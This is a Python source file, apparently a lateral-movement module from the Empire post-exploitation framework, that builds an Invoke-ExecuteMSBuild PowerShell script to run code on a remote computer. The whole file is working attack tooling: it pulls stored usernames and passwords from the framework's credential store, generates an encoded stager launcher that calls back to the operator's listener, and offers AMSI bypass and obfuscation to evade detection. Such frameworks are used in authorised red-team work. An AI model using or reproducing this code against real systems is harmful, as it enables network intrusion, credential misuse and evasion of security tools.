from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Set booleans to false by default
        obfuscate = False
        amsi_bypass = False
        amsi_bypass2 = False

        listener_name = params['Listener']
        command = params['Command']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']
        if (params['AMSIBypass']).lower() == 'true':
            amsi_bypass = True
        if (params['AMSIBypass2']).lower() == 'true':
            amsi_bypass2 = True

        module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        script_end = "Invoke-ExecuteMSBuild"
        cred_id = params["CredID"]
        if cred_id != "":

            if not main_menu.credentials.is_credential_valid(cred_id):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (cred_id, credType, domainName, userName, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]

            if domainName != "":
                params["UserName"] = str(domainName) + "\\" + str(userName)
            else:
                params["UserName"] = str(userName)
            if password != "":
                params["Password"] = password

        # Only "Command" or "Listener" but not both
        if (listener_name == "" and command  == ""):
          print(helpers.color("[!] Listener or Command required"))
          return ""
        if (listener_name and command):
          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
          return ""

        if not main_menu.listeners.is_listener_valid(listener_name) and not command:
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""
        elif listener_name:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               userAgent=user_agent, proxy=proxy,
                                                               proxyCreds=proxy_creds, AMSIBypass=amsi_bypass,
                                                   AMSIBypass2=amsi_bypass2)
            if launcher == "":
                return ""
            else:
                launcher = launcher.replace('$','`$')
                script = script.replace('LAUNCHER',launcher)
        else:
            Cmd = command.replace('"','`"').replace('$','`$')
            script = script.replace('LAUNCHER',Cmd)
            print(helpers.color("[*] Running command:  " + command))


        # add any arguments to the end execution of the script
        script_end += " -ComputerName " + params['ComputerName']

        if params['UserName'] != "":
            script_end += " -UserName \"" + params['UserName'] + "\" -Password \"" + params['Password'] + "\""

        if params['DriveLetter']:
            script_end += " -DriveLetter \"" + params['DriveLetter'] + "\""

        if params['FilePath']:
            script_end += " -FilePath \"" + params['FilePath'] + "\""

        script_end += " | Out-String"

        # Get the random function name generated at install and patch the stager with the proper function name
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
